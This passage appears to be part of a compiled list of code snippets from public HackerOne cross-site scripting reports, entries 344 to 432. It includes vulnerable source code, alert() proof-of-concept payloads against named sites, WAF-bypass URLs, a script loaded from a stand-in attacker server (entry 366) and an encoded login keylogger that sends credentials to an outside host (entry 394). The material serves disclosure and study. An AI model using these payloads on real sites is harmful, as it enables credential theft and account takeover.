               ulist.push('<li><a href="'+item+'/">'+item+'/</a></li>')
           } else {
               ulist.push('<li><a href="'+item+'">'+item+'</a></li>')
           }
            cb();
        });
    }, 4);
```

## 344. [#308155](https://hackerone.com/reports/308155)  -  [html-janitor] Passing user-controlled data to clean() leads to XSS
*critical*

```js
HTMLJanitor.prototype.clean = function (html) {
    var sandbox = document.createElement('div'); // This is not a safe way to create a sandbox.
    sandbox.innerHTML = html; // At this point, the onerror in the img is triggered.
```

## 345. [#986386](https://hackerone.com/reports/986386)  -  Reflected XSS on www.hackerone.com via Wistia embed code
*low, $500*

```html
<script
  src="https://fast.wistia.com/embed/medias/t306dw04gl.jsonp"
  async=""
></script>
<script src="https://fast.wistia.com/assets/external/E-v1.js" async=""></script>
<div class="wistia_embed wistia_async_t306dw04gl videoFoam=true"></div>
```

## 346. [#986386](https://hackerone.com/reports/986386)  -  Reflected XSS on www.hackerone.com via Wistia embed code
*low, $500*

```html
<script src="//code.angularjs.org/1.8.0/angular.js"></script>
<div ng-app>
  <img
    src="/"
    ng-on-error="$event.srcElement.ownerDocument.defaultView.alert($event.srcElement.ownerDocument.domain)"
  />
</div>
```

## 347. [#662083](https://hackerone.com/reports/662083)  -  Inject page in admin panel via Shopify.API.pushState
*low, $500*

```html
<script>
alert("XSS By Tiago")
console.log("Document:", document)
console.log("Window:", window)
console.log("Cookies:", document.cookie)
console.log("Location:", window.location)
console.log("CSRF Token:", document.querySelectorAll('[data-serialized-id="csrf"]')[0].innerText)
</script>
```

## 348. [#592316](https://hackerone.com/reports/592316)  -  Stored XSS on byddypress Plug-in via groups name
*low*

```
<a href="accesskey=x onclick=alert(document .domain)//"></a>
```

## 349. [#979204](https://hackerone.com/reports/979204)  -  XSS on https://partners.acronis.com/
*low*

```
https://partners.acronis.com/en-us/profile/login.html?-back=\u0022\u003e\u003cimg+src=x+onerror=alert(1)\u003e\u003cx+y=\u0022
```

## 350. [#629745](https://hackerone.com/reports/629745)  -  Reflected cross-site scripting on multiple Starbucks assets.
*low*

```
htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm`1`%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1
```

## 351. [#629745](https://hackerone.com/reports/629745)  -  Reflected cross-site scripting on multiple Starbucks assets.
*low*

```
htp8bi2zcg" accesskey='x' onclick='confirm`1`' //2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1
```

## 352. [#629745](https://hackerone.com/reports/629745)  -  Reflected cross-site scripting on multiple Starbucks assets.
*low*

```html
<link rel="canonical" href="https://www.starbucks.co.uk/htp8bi2zcg" accesskey="x" onclick="confirm`1`" 2injectiontrme47nbfq="" blonde="" bright-sky-blend="" ground="1&quot;">
```

## 353. [#578138](https://hackerone.com/reports/578138)  -  [http_server] Stored XSS in the filename when directories listing
*low*

```
<img src=x onmouseover=alert(1)>
```

## 354. [#716761](https://hackerone.com/reports/716761)  -  WAF bypass via double encoded non standard ASCII chars permitted a reflected XSS on response page not found pages - (629745 bypass)
*low*

```
https://www.starbucks.com.br/testing%2522%2520accesskey='x'%2520onclick='confirm%601%60'
```

## 355. [#716761](https://hackerone.com/reports/716761)  -  WAF bypass via double encoded non standard ASCII chars permitted a reflected XSS on response page not found pages - (629745 bypass)
*low*

```
https://www.starbucks.com.br/testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'
```

## 356. [#716761](https://hackerone.com/reports/716761)  -  WAF bypass via double encoded non standard ASCII chars permitted a reflected XSS on response page not found pages - (629745 bypass)
*low*

```
https://www.starbucks.com.br/testing%2522%FF%2520accesskey='x'%2520onclick='confirm%601%60'
```

## 357. [#716761](https://hackerone.com/reports/716761)  -  WAF bypass via double encoded non standard ASCII chars permitted a reflected XSS on response page not found pages - (629745 bypass)
*low*

```
https://www.starbucks.com.br/testing%2522%7F%2520accesskey='x'%2520onclick='confirm%601%60'
```

## 358. [#716761](https://hackerone.com/reports/716761)  -  WAF bypass via double encoded non standard ASCII chars permitted a reflected XSS on response page not found pages - (629745 bypass)
*low*

```
https://www.starbucks.com.br/testing%80%2522%2520accesskey='x'%2520onclick='confirm%601%60'
```

## 359. [#716761](https://hackerone.com/reports/716761)  -  WAF bypass via double encoded non standard ASCII chars permitted a reflected XSS on response page not found pages - (629745 bypass)
*low*

```
https://www.starbucks.com.br/testing%7F%2522%2520accesskey='x'%2520onclick='confirm%601%60'
```

## 360. [#961787](https://hackerone.com/reports/961787)  -  CSRF and XSS on www.acronis.com
*low*

```html
<form action=https://www.acronis.com/en-us/my/remind/index.html method=POST><input type=hidden name="token" value="a016902ceaeb6ae91c21302631fbbcfc"><input type=hidden name="SN" value="818198181891891981981981516518198198"><input type=hidden name="OrderId" value=""><input type=hidden name="Submit" value="Send+E-mail%0D%0A"><input type=hidden name="c" value="1&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(document.cookie)&lt;!--"><input type=submit value=XSS-Acronis></form>
```

## 361. [#406587](https://hackerone.com/reports/406587)  -  Self DOM-Based XSS in www.hackerone.com
*low*

```html
<img src=x onerror=alert(1) />
```

## 362. [#1687410](https://hackerone.com/reports/1687410)  -  [user_oidc] Stored XSS via Authorization Endpoint - Safari-Only
*low*

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
[...]

{
  "issuer":"http:\/\/idp.local:3000",
  "authorization_endpoint":"'\" http-equiv=><svg\/onload=alert(document.domain)>",
[...]
}
```

## 363. [#1167034](https://hackerone.com/reports/1167034)  -  Reflected Cross Site Scripting at http://www.grouplogic.com/files/glidownload/verify3.asp [Uppercase Filter Bypass]
*low*

```
PoC 1:
http://www.grouplogic.com/files/glidownload/verify3.asp?version=CC1100x7660&serial=%3Ch1+onmouseover=[][%22\146\151\154\164\145\162%22][%22\143\157\156\163\164\162\165\143\164\157\162%22](%22\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\144\157\155\141\151\156\51%22)()%3Etest%3C/h1%3E

PoC 2:
http://www.grouplogic.com/files/glidownload/verify3.asp?version=CC1100x7660&serial=%3Cimg+src=x+onerror=[][%22\146\151\154\164\145\162%22][%22\143\157\156\163\164\162\165\143\164\157\162%22](%22\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\144\157\155\141\151\156\51%22)()%3Etest%3C/h1%3E

PoC3:
http://www.grouplogic.com/files/glidownload/verify3.asp?version=CC1100x7660&serial=%3Cimg+src=x+onerror=[][%22\146\151\154\164\145\162%22][%22\143\157\156\163\164\162\165\143\164\157\162%22](%22\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\143\157\157\153\151\145\51%22)()%3Etest%3C/h1%3E
```

## 364. [#1166918](https://hackerone.com/reports/1166918)  -  Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm
*low*

```
Payload 1: Mouse Over XSS
---------------------------
%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>


Payload 2: 
---------
%0d%0a</script><img+src=x+onerror=alert(document.domain)>
```

## 365. [#1166918](https://hackerone.com/reports/1166918)  -  Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm
*low*

```
http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>

http://www.grouplogic.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><img+src=x+onerror=alert(document.domain)>
```

## 366. [#310133](https://hackerone.com/reports/310133)  -  [glance] Stored XSS via file name allows to run arbitrary JavaScript when directory listing is displayed in browser
*low*

```html
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>

    <script type="text/javascript" src="http://attacker.server/malware.js"></script>
</body>

</html>
```

## 367. [#2509022](https://hackerone.com/reports/2509022)  -  Reflected XSS in AI Chat Bot Greetings at help.shopify.com via Markdown Image Rendering
*medium, $1,600*

```
${JSON.stringify(window.__remixContext.state.loaderData.root.userInfo)}
```

## 368. [#2089042](https://hackerone.com/reports/2089042)  -  yelp.com and biz.yelp.com ATO via XSS + Cookie Bridge
*medium*

```
${'X'.repeat(1000)}
```

## 369. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```
${messageObject.msg}
```

## 370. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```
${messageObject.username}
```

## 371. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```
${timestamp}
```

## 372. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```
${escapeHTML(messageObject.username)}
```

## 373. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```
${escapeHTML(timestamp)}
```

## 374. [#753971](https://hackerone.com/reports/753971)  -  [htmr] DOM-based XSS
*medium*

```
${window.location.hash}
```

## 375. [#355458](https://hackerone.com/reports/355458)  -  [statics-server] XSS via injected iframe in file name when statics-server displays directory index in the browser
*medium*

```
${req.url}
```

## 376. [#1392733](https://hackerone.com/reports/1392733)  -  xss(r) vcc-na11.8x8.com
*medium*

```json
{{#txt_unsupported_browser_chrome#}}
```

## 377. [#356809](https://hackerone.com/reports/356809)  -  [exceljs] Possible XSS via cell value when worksheet is displayed in browser
*medium*

```
${worksheet.getCell('A1').value}
```

## 378. [#356809](https://hackerone.com/reports/356809)  -  [exceljs] Possible XSS via cell value when worksheet is displayed in browser
*medium*

```
${worksheet.getCell('A2').value}
```

## 379. [#356809](https://hackerone.com/reports/356809)  -  [exceljs] Possible XSS via cell value when worksheet is displayed in browser
*medium*

```
${worksheet.getCell('A3').value}
```

## 380. [#356809](https://hackerone.com/reports/356809)  -  [exceljs] Possible XSS via cell value when worksheet is displayed in browser
*medium*

```
${worksheet.getCell('B1').value}
```

## 381. [#356809](https://hackerone.com/reports/356809)  -  [exceljs] Possible XSS via cell value when worksheet is displayed in browser
*medium*

```
${worksheet.getCell('B2').value}
```

## 382. [#356809](https://hackerone.com/reports/356809)  -  [exceljs] Possible XSS via cell value when worksheet is displayed in browser
*medium*

```
${worksheet.getCell('B3').value}
```

## 383. [#1731349](https://hackerone.com/reports/1731349)  -  Stored XSS via Kroki diagram
*high, $13,950*

```ruby
diagram_selectors = ::Gitlab::Kroki.formats(settings)
                                .map do |diagram_type|
                                  %(pre[lang="#{diagram_type}"] > code,
                                  pre > code[lang="#{diagram_type}"])
                                end
                                .join(', ')

        xpath = Gitlab::Utils::Nokogiri.css_to_xpath(diagram_selectors)
        return doc unless doc.at_xpath(xpath)

        diagram_format = "svg"
        doc.xpath(xpath).each do |node|
          diagram_type = node.parent['lang'] || node['lang']
          diagram_src = node.content
          image_src = create_image_src(diagram_type, diagram_format, diagram_src)
```

## 384. [#1731349](https://hackerone.com/reports/1731349)  -  Stored XSS via Kroki diagram
*high, $13,950*

```ruby
image_src = create_image_src(diagram_type, diagram_format, diagram_src)
          img_tag = Nokogiri::HTML::DocumentFragment.parse(%(<img src="#{image_src}" />))
          img_tag = img_tag.children.first

          next if img_tag.nil?

          lazy_load = diagram_src.length > MAX_CHARACTER_LIMIT
          img_tag.set_attribute('hidden', '') if lazy_load
          img_tag.set_attribute('class', 'js-render-kroki')

          img_tag.set_attribute('data-diagram', diagram_type)
          img_tag.set_attribute('data-diagram-src', "data:text/plain;base64,#{Base64.strict_encode64(diagram_src)}")

          node.parent.replace(img_tag)
```

## 385. [#508184](https://hackerone.com/reports/508184)  -  Persistent XSS in Note objects
*high, $4,500*

```
define_method(invalidation_method) do
        changed_fields = changed_attributes.keys
        invalidations  = changed_fields & [markdown_field.to_s, *INVALIDATED_BY]
        invalidations.delete(markdown_field.to_s) if changed_fields.include?("#{markdown_field}_html")

        !invalidations.empty? || !cached_html_up_to_date?(markdown_field)
      end
```

## 386. [#508184](https://hackerone.com/reports/508184)  -  Persistent XSS in Note objects
*high, $4,500*

```
INVALIDATED_BY = %w[author project].freeze
...
        invalidations  = changed_fields & [markdown_field.to_s, *INVALIDATED_BY]
        invalidations.delete(markdown_field.to_s) if changed_fields.include?("#{markdown_field}_html")
```

## 387. [#946728](https://hackerone.com/reports/946728)  -  SafeParamsHelper::safe_params is not so safe
*high, $4,000*

```haml
- viewer_url = local_assigns.fetch(:viewer_url) { url_for(safe_params.merge(viewer: viewer.type, format: :json)) } if load_async
.blob-viewer{ data: { type: viewer.type, rich_type: rich_type, url: viewer_url, path: viewer.blob.path }, class: ('hidden' if hidden) }
```

## 388. [#1198517](https://hackerone.com/reports/1198517)  -  Stored XSS in custom emoji
*high, $3,000*

```
# gitlab-rails console
--------------------------------------------------------------------------------
 Ruby:         ruby 2.7.2p137 (2020-10-01 revision 5445e04352) [x86_64-linux]
 GitLab:       13.11.3 (b321336e443) FOSS
 GitLab Shell: 13.17.0
 PostgreSQL:   12.6
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.3.6)
irb(main):001:0> Feature.enable(:custom_emoji)
=> true
```

## 389. [#1398305](https://hackerone.com/reports/1398305)  -  Stored XSS on issue comments and other pages which contain notes
*high, $3,000*

```js
export function emojiImageTag(name, src) {
  return `<img class="emoji" title=":${name}:" alt=":${name}:" src="${src}" width="20" height="20" align="absmiddle" />`;
}
```

## 390. [#603764](https://hackerone.com/reports/603764)  -  DOM Based XSS via postMessage at https://inventory.upserve.com/login/
*high, $2,500*

```javascript
window.addEventListener("message", function(e) {
  if (~e.origin.indexOf("https://hq.upserve.com")) {
    if (e.data && typeof e.data == "object") {
      try {
        if (e.data["exec"]) {
          eval(e.data["exec"]);
        }
      } catch (err) {
        console.log(err);
      }
    } else {
      console.log("Non-object passed");
    }
  } else {
    console.log("Incorrect origin: " + e.origin.toString());
    return;
  }
});
```

## 391. [#3608199](https://hackerone.com/reports/3608199)  -  DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover
*high, $500*

```bash
git clone https://github.com/basecamp/fizzy.git
cd fizzy
git fetch origin
git checkout 4211e20a663eb5ad8d4ca3340a1f8d247472c4dc
docker build -t fizzy-main-latest .
```

## 392. [#3608199](https://hackerone.com/reports/3608199)  -  DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover
*high, $500*

```
http://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/email_addresses/.../confirmation
```

## 393. [#3608199](https://hackerone.com/reports/3608199)  -  DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover
*high, $500*

```
Subject: Confirm your new email address
http://172.17.0.7:3000/40002/users/03frq8zae2a7m9cari0v89xua/email_addresses/.../confirmation
```

## 394. [#2010530](https://hackerone.com/reports/2010530)  -  yelp.com XSS ATO (via login keylogger, link Google account)
*high*

```
https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=c2V0VGltZW91dChmdW5jdGlvbiAoKSB7CiAgYSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCdwYXNzd29yZCcpWzBdOwogIGIgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnZW1haWwnKVswXTsKICBmdW5jdGlvbiBmKCkgewogICAgZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8/YT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKTsKICB9CiAgYS5mb3JtLm9uY2xpY2s9ZjsKICBhLm9uY2hhbmdlPWY7CiAgYi5vbmNoYW5nZT1mOwogIGEub25pbnB1dD1mOwogIGIub25pbnB1dD1mOwp9LCAxMDAwKQ
```

## 395. [#422043](https://hackerone.com/reports/422043)  -  H1514 DOMXSS on Embedded SDK via Shopify.API.setWindowLocation abusing cookie Stuffing
*high*

```javascript
e.setWindowLocation = function(e) {
    return window.location = e
}, e.bindWindowLocation = function() {
    return _Shopify.Messenger.addHandler("Shopify.API.setWindowLocation", function(e) {
        return function(t, n) {
            return e.setWindowLocation(n)
        }
    }(this))
}
```

## 396. [#998398](https://hackerone.com/reports/998398)  -  Prototype Pollution leads to XSS on https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)
*high*

```
pInstall._convertStringHooksToFunctions = function() {
            var functionHooks = {};
            $.each(this._userServerConfiguration.install.hooks, function(hookName, hookFunction) {
                functionHooks[hookName] = eval(hookFunction) //eval everything in the object
            }),
            this._userServerConfiguration.install.hooks = functionHooks
        }
```

## 397. [#1588732](https://hackerone.com/reports/1588732)  -  CSP-bypass XSS in project settings page
*high*

```javascript
deployKeyRowHtml(key, isActive) {
    const isActiveClass = isActive || '';

    return `
      <li>
        <a href="#" class="${isActiveClass}">
          <strong>${key.title}</strong>
          <p>
            ${sprintf(
              __('Owned by %{image_tag}'),
              {
                image_tag: `<img src="${key.avatar_url}" class="avatar avatar-inline s26" width="30">`,
              },
              false,
            )}
            <strong class="dropdown-menu-user-full-name gl-display-inline">${escape(
              key.fullname,
            )}</strong>
            <span class="dropdown-menu-user-username gl-display-inline">${key.username}</span>
          </p>
        </a>
      </li>
    `;
  }
```

## 398. [#2371019](https://hackerone.com/reports/2371019)  -  DOM XSS on multiple Automattic domains through postMessages
*high*

```javascript
if (_.isArray(r.custom)) {
            i = _.template(e("#tmpl-custom-button").html());
            s = _.map(r.custom, function(e) {
                var t = g.parseUrl(e.icon);
                return new d({
                    ID: e.name,
                    markup: i({
                        icon: o + "/" + t.host + t.pathname,
                        name: e.name
                    })
                })
            });
            n = n.concat(s)
        }
```

## 399. [#2371019](https://hackerone.com/reports/2371019)  -  DOM XSS on multiple Automattic domains through postMessages
*high*

```javascript
element.innerHTML = `
				<a href="${ encodeURI( liker.profile_URL ) }" rel="nofollow" target="_parent" class="wpl-liker">
					<img src="${ liker.avatar_URL }"
						alt=""
						style="width: 28px; height: 28px;" />
					<span></span>
				</a>
				`;
```

## 400. [#2257080](https://hackerone.com/reports/2257080)  -  Stored-XSS injected in Wiki page via Banzai pipeline
*high*

```ruby
# https://gitlab.com/gitlab-org/gitlab/blob/e03b60053f7f7d35c05b2732f59524a6bc6a5456/lib/banzai/reference_redactor.rb#L66
  def redacted_node_content(node)
      original_content = node.attr('data-original')
      original_content = CGI.escape_html(original_content) if original_content

      original_link =
        if node.attr('data-link-reference') == 'true'
          href = node.attr('href')

          %(<a href="#{href}">#{original_content}</a>)
        end

      original_link || original_content || node.inner_html
    end
```

## 401. [#977697](https://hackerone.com/reports/977697)  -  Stored-XSS in merge requests
*high*

```ruby
%span
    = _('Source branch: %{source_branch_open}%{source_branch}%{source_branch_close}').html_safe % { source_branch_open: "<cite title='#{source_branch}'>".html_safe, source_branch_close: "</cite>".html_safe, source_branch: source_branch }
```

## 402. [#227486](https://hackerone.com/reports/227486)  -  XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)
*high*

```javascript
$("#checkout").bind("click", function(e) {
    $("#checkoutButton").trigger("click")
});
```

## 403. [#317125](https://hackerone.com/reports/317125)  -  [bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template
*high*

```javascript
// app.js file
const http = require('http')
const bracket = require('bracket-template').default
const port = 8080

function createHTML(name) {
    let tpl = `
        [[ const n = '${name}'; ]]
        <strong>Hello [[= n ]]</strong>
    `
    return bracket.compile(tpl)
}

const requestHandler = (request, response) => {
    const name = request.url.split('=')[1]
    response.writeHeader(200, { "Content-Type": "text/html" });
    response.write(createHTML(name)());
    response.end();
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log(err)
    }
    console.log(`server is listening on ${port}`)
})
```

## 404. [#858874](https://hackerone.com/reports/858874)  -  Stored XSS in TSVB Visualizations Markdown Panel
*high*

```
confirm("XSS Less plugin");
module.exports = {
  install: function(less, pluginManager, functions) {
    functions.add('xss', function(val) {
      return val.value;
    });
  }
};
```

## 405. [#397088](https://hackerone.com/reports/397088)  -  Stored XSS on buy button
*low, $500*

```json
{{amount}}
```

## 406. [#646505](https://hackerone.com/reports/646505)  -  ██████ DOM XSS via Shopify.API.remoteRedirect
*low*

```
${payload}
```

## 407. [#341969](https://hackerone.com/reports/341969)  -  DOM XSS in edoverflow.com/tools/respond due to unsafe usage of the innerHTML property.
*low*

```json
{{triager}}
```

## 408. [#341969](https://hackerone.com/reports/341969)  -  DOM XSS in edoverflow.com/tools/respond due to unsafe usage of the innerHTML property.
*low*

```json
{{username}}
```

## 409. [#474262](https://hackerone.com/reports/474262)  -  XSS due to incomplete JS escaping
*low*

```
${alert()}
```

## 410. [#474262](https://hackerone.com/reports/474262)  -  XSS due to incomplete JS escaping
*low*

```
${expression}
```

## 411. [#453795](https://hackerone.com/reports/453795)  -  [harp] Unsafe rendering of Markdown files
*low*

```
../../error
```

## 412. [#1081167](https://hackerone.com/reports/1081167)  -  Read/Write arbitrary (non-HttpOnly) cookies on checkout pages via GoogleAnalyticsAdditionalScripts postMessage handler
*medium, $1,600*

```js
// From checkout-b0ace6cd81eb816d383ce78462bdcd5cfc3cfef0055b9ff774fd9de732b3d9d2.js
function r(e) {
  "analytics" === e.data.type && ("undefined" == typeof n.calls && (n.calls = []),
  n.calls = n.calls.concat(e.data.calls),
  document.body.dispatchEvent(new CustomEvent("GoogleAnalyticsEvent")))
}
// [snip]
window.addEventListener("message", r)
// [snip]
[{
    key: "executeAdditionalScripts",
    value: function n() {
        var e = t.calls;
        void 0 !== e && (e.forEach(function(e) {
            var t;
            (t = window).ga.apply(t, C(e))
        }),
        t.calls = [])
    }
}]
// From checkout HTML page
document.body.addEventListener("GoogleAnalyticsEvent", function() {
  window.GoogleAnalyticsAdditionalScripts.executeAdditionalScripts()
});
```

## 413. [#1081167](https://hackerone.com/reports/1081167)  -  Read/Write arbitrary (non-HttpOnly) cookies on checkout pages via GoogleAnalyticsAdditionalScripts postMessage handler
*medium, $1,600*

```js
var win = window.open("https://bored-engineering-whitehat-2.myshopify.com/20276739/checkouts/0f446f1d92e2d55bb576273ebb3fc89c")
setTimeout(function() {
  win.frames[0].postMessage({
    "type": "analytics",
    "calls": [
      ['send', 'pageview']
    ]
  }, "*")
}, 2000)
```

## 414. [#1081167](https://hackerone.com/reports/1081167)  -  Read/Write arbitrary (non-HttpOnly) cookies on checkout pages via GoogleAnalyticsAdditionalScripts postMessage handler
*medium, $1,600*

```js
var ea = function(a) {
  return "function" == typeof a
}
// [snip]
a = a[2];
// [snip]
if (this.g && (!qa(b) || "" == b || !ea(a)))
  throw "abort";
```

## 415. [#1081167](https://hackerone.com/reports/1081167)  -  Read/Write arbitrary (non-HttpOnly) cookies on checkout pages via GoogleAnalyticsAdditionalScripts postMessage handler
*medium, $1,600*

```js
Zd = {
  ec: 45,
  ecommerce: 46,
  linkid: 47
};
// [snip]
y = function(a, b, c, d, e) {
  if (!ea(Yd.get(b)) && !$d.get(b)) {
     Zd.hasOwnProperty(b) && J(Zd[b]);
```

## 416. [#1081167](https://hackerone.com/reports/1081167)  -  Read/Write arbitrary (non-HttpOnly) cookies on checkout pages via GoogleAnalyticsAdditionalScripts postMessage handler
*medium, $1,600*

```js
window.additionalScripts = function() {
    // JS controlled by the attacker 
};
// [snip]
{
  key: "receiveMessage",
  value: function o(e) {
    if (e.source === window.parent && "checkout_context" === e.data.type) {
      this.origin = e.origin, window.Shopify = e.data.Shopify, window.__st = e.data.__st;
      try {
        window.additionalScripts()
      } catch (t) {
        console.error("User script error: ", t)
      }
    }
  }
}
// [snip]
var t = this;
window.addEventListener("message", function(e) {
  return t.receiveMessage(e)
}, !1)
```

## 417. [#1194254](https://hackerone.com/reports/1194254)  -  XSS by clicking Jira's link
*medium, $1,130*

```haml
module ExternalLinkHelper
  def external_link(body, url, options = {})
    link_to url, { target: '_blank', rel: 'noopener noreferrer' }.merge(options) do
      "#{body}#{sprite_icon('external-link', css_class: 'gl-ml-1')}".html_safe
    end
  end
end
```

## 418. [#406704](https://hackerone.com/reports/406704)  -  XSS @ store.steampowered.com via agecheck path name
*medium, $750*

```
https://store.steampowered.com/agecheck/appmhuh2',{ sessionid: g_sessionID, ageDay: '', ageMonth: '', ageYear: '' } ).done( function( response ) { }%20 );}alert`XSS-by-TvM`;function x(){$J.post('mr2n2/247660/
```

## 419. [#1518343](https://hackerone.com/reports/1518343)  -  Reflected XSS in the shared note view on https://evernote.com
*medium, $500*

```javascript
renderAfterSaveNoteView() {
	if (W())
		if (R.isMobile) {
			const e = oe(R.isMobile);
			e && (window.location.href = e)
		} else {
			const e = function () {
				const e = W();
				let n = e && e.ionUrl;
				return n && -1 === n.indexOf(J.baseUrl) ? null : n
			}();
			e && (window.location.href = e)
		}
	return null
}
```

## 420. [#949513](https://hackerone.com/reports/949513)  -  XSS by file (Active Storage `Proxying`)
*medium, $500*

```ruby
source 'https://rubygems.org'
git_source(:github) { |repo| "https://github.com/#{repo}.git" }

ruby '2.7.1'

gem 'rails', github: "rails/rails", branch: "master"
gem 'sqlite3', '~> 1.4'
gem 'puma', '~> 4.1'

gem 'bootsnap', '>= 1.4.2', require: false

group :development do
  gem 'listen', '~> 3.2'
end
```

## 421. [#949513](https://hackerone.com/reports/949513)  -  XSS by file (Active Storage `Proxying`)
*medium, $500*

```erb
# views/layouts/application.html.erb
<!DOCTYPE html>
<html>
  <head>
    <title>ProxyXss</title>
    <%= csrf_meta_tags %>
    <%= csp_meta_tag %>
  </head>

  <body>
    <%= yield %>
  </body>
</html>
```

## 422. [#949513](https://hackerone.com/reports/949513)  -  XSS by file (Active Storage `Proxying`)
*medium, $500*

```erb
# views/user/new.html.erb
<%= form_with model: @user, local: true, :url => {:action => :create}  do |form| %>
  <%= form.text_area :name %><br>
  <%= form.file_field :image %><br>
  <%= form.submit %>
<% end %>
```

## 423. [#949513](https://hackerone.com/reports/949513)  -  XSS by file (Active Storage `Proxying`)
*medium, $500*

```erb
# views/user/show.html.erb
<% if @user.image.attached? %>
  <%= image_tag @user.image %>
<% end %>
```

## 424. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```typescript
const message = italicTypes.includes(messageType)
  ? `<i>${messageObject.msg}</i>`
  : messageObject.msg;

file.push(`<p><strong>${messageObject.username}</strong> (${timestamp}):<br/>`);
file.push(message);
```

## 425. [#1087061](https://hackerone.com/reports/1087061)  -  Stored-XSS on wiki pages
*medium*

```ruby
... "<a href='#{@page.last_version.author_url}'>".html_safe ...
```

## 426. [#1087061](https://hackerone.com/reports/1087061)  -  Stored-XSS on wiki pages
*medium*

```ruby
delegate :message, :sha, :id, :author_name, :author_email, :authored_date, to: :commit

      def author_url
        user = ::User.find_by_any_email(author_email)
        user.nil? ? "mailto:#{author_email}" : Gitlab::UrlBuilder.build(user)
      end
```

## 427. [#2389565](https://hackerone.com/reports/2389565)  -  Action Text XSS (Rails 7.1.x)
*medium*

```
❯ rails new -C  -G -T text
# => Rails 7.1.3.2, Ruby 3.2.3

❯ cd text

❯ bin/rails g scaffold Blog title:string body:rich_text

❯ bin/rails action_text:install

❯ bundle install

❯ bin/rails db:migrate

❯ bin/rails s
```

## 428. [#2931688](https://hackerone.com/reports/2931688)  -  ActionView sanitize helper bypass with 'style' and 'svg' tags
*medium*

```ruby
<%= sanitize @comment.body, tags: ["math", "style"] %>
<%# or %>
<%= sanitize @comment.body, tags: ["svg", "style"] %>
```

## 429. [#2931710](https://hackerone.com/reports/2931710)  -  #2931639   ActionView sanitize helper bypass with math-related tags
*medium*

```ruby
<%= sanitize @comment.body, tags: ["math", "mtext", "table", "style", "mglyph"] %>
<%# or %>
<%= sanitize @comment.body, tags: ["math", "mtext", "table", "style", "malignmark"] %>
```

## 430. [#2931639](https://hackerone.com/reports/2931639)  -  ActionView sanitize helper bypass with style
*medium*

```ruby
<%= sanitize @comment.body, tags: ["style"] %>
```

## 431. [#396493](https://hackerone.com/reports/396493)  -  Reflected DOM XSS on www.starbucks.co.uk
*medium*

```js
function d() {
  url = location.href;
  hashtag = (url.indexOf("#!") != -1) ? decodeURI(url.substring(url.indexOf("#!") + 2, url.length)) : false;
  return hashtag
}

hashIndex = d();
hashRel = hashIndex;
hashIndex = hashIndex.substring(hashIndex.indexOf("/") + 1, hashIndex.length - 1);
hashRel = hashRel.substring(0, hashRel.indexOf("/"));
hashIndex = parseInt(hashIndex);
hashRel = hashRel.replace(/([ #;&,.+*~\':"!^$[\]()=>|\/])/g, "\\$1");
setTimeout(function() {
  b("a[rel^='" + hashRel + "']:eq(" + hashIndex + ")").trigger("click")
}, 50)
```

## 432. [#355458](https://hackerone.com/reports/355458)  -  [statics-server] XSS via injected iframe in file name when statics-server displays directory index in the browser
*medium*

```javascript
// ./node_modules/statics-server/index.js, line 18:

    if(fs.lstatSync(staticPath).isDirectory()){
        var files=fs.readdirSync(staticPath);
        var lis='';
        files.forEach((v,i)=>{
            if(fs.lstatSync(path.resolve(staticPath,v)).isDirectory()){
